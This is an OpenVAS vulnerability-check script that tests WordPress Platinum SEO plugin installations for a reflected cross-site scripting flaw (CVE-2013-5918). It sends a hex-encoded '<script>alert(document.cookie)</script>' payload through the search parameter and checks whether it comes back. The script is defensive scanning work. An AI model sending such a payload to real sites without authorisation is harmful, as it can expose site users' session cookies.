###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_platinum_seo_xss_vuln.nasl 11883 2018-10-12 13:31:09Z cfischer $
#
# WordPress Platinum SEO plugin Cross Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804020");
  script_version("$Revision: 11883 $");
  script_cve_id("CVE-2013-5918");
  script_bugtraq_id(62692);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 15:31:09 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-09-27 18:05:55 +0530 (Fri, 27 Sep 2013)");
  script_name("WordPress Platinum SEO plugin Cross Site Scripting Vulnerability");

  script_tag(name:"summary", value:"This host is installed with WordPress Platinum SEO plugin and is prone to
cross site scripting vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check whether it is able to read the
cookie or not.");
  script_tag(name:"solution", value:"Upgrade to version 1.3.8 or later.");
  script_tag(name:"insight", value:"Input passed via the 's' parameter to platinum_seo_pack.php script is
not properly sanitized before being returned to the user.");
  script_tag(name:"affected", value:"WordPress Platinum SEO Plugin version 1.3.7 and prior.");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site.");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

url = dir + '/?s=\\x3C\\x2F\\x74\\x69\\x74\\x6C\\x65\\x3E\\x3C\\x73\\x63'+
            '\\x72\\x69\\x70\\x74\\x3E\\x61\\x6C\\x65\\x72\\x74\\x28\\x64'+
            '\\x6F\\x63\\x75\\x6D\\x65\\x6E\\x74\\x2E\\x63\\x6F\\x6F\\x6B'+
            '\\x69\\x65\\x29\\x3C\\x2F\\x73\\x63\\x72\\x69\\x70\\x74\\x3E';

## Extra check is not possible
if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
                   pattern:"<script>alert\(document\.cookie\)</script>"))
{
  security_message(http_port);
  exit(0);
}
